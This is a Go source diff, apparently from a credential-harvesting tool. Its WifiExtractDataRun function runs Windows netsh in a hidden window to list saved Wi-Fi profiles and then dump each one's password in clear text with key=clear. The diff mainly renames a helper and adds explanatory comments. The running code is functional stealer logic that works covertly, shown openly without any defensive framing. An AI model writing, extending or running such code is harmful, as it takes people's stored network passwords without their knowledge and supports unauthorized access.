@@ -8,7 +8,7 @@ import (
 	"syscall"
 )
 
-func ExecCommand(command string, params []string) string {
+func execCommand(command string, params []string) string {
 	cmd_li := exec.Command(command, params...)
 	cmd_li.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //run CMD in hidden mode
 	output, _ := cmd_li.Output()
@@ -18,21 +18,32 @@ func ExecCommand(command string, params []string) string {
 	return string(output)
 }
 
+/*
+	Function for WiFi credentials extracting. No support for WPA2 Enterprise (see README).
+ */
 func WifiExtractDataRun() common.ExtractCredentialsNamePass {
+
+	/**
+		For WiFI credentials extract we use system utility "netsh"
+
+		1. Get profile names (SSID) - `netsh wlan show profiles`
+		2. Get saved password for wifi access point - `netsh wlan show profile SSID key=clear`
+			key=clear parameter used to display the password in clear text
+	 */
+
 	params := []string{
 		"wlan",
 		"show",
 		"profiles",
 	}
 
-	var output = ExecCommand("netsh", params)
+	var output = execCommand("netsh", params)
 	var lines = strings.Split(output, "\r\n")
 	var users []string
 
 	for i := range lines {
 		if strings.Contains(lines[i], "All User") { //TODO check in multiple languages
 			users = append(users, strings.TrimSpace(strings.Split(lines[i], ":")[1]))
-			//println(strings.TrimSpace(strings.Split(lines[i], ":")[1]))
 		}
 	}
 
@@ -47,7 +58,7 @@ func WifiExtractDataRun() common.ExtractCredentialsNamePass {
 			"key=clear",
 		}
 
-		var output = ExecCommand("netsh", paramWifi)
+		var output = execCommand("netsh", paramWifi)
 		var lines = strings.Split(output, "\r\n")
 
 		for j := range lines {
